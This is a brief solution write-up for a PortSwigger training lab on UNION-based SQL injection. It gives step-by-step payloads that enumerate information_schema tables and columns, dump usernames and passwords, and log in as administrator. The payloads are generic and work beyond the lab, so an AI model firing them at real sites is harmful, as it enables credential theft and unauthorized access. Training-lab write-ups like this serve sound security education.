# Lab 09 — SQL injection attack, listing the database contents on non-Oracle databases

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

**Entry point:** `GET /filter?category=`

## Goal

Enumerate the schema via `information_schema`, dump the credentials table,
and log in as `administrator`.

## Solution

1. Confirm **2 columns**, second is text:

```
'+UNION+SELECT+NULL,'a'--
```

2. List all tables (table names have a random suffix, e.g. `users_xxxxxx`):

```
'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
```

3. List the columns of the credentials table:

```
'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users_xxxxxx'--
```

→ columns are `username` and `password`.

4. Dump the rows:

```
'+UNION+SELECT+NULL,username||':'||password+FROM+users_xxxxxx--
```

5. Log in as `administrator` with the leaked password — lab solved.

## Notes

- `information_schema` is the standard metadata catalog on MySQL,
  PostgreSQL and SQLite (SQLite: `sqlite_master`).
- Oracle has no `information_schema` — use `all_tables` / `all_tab_columns`
  instead (lab 10).
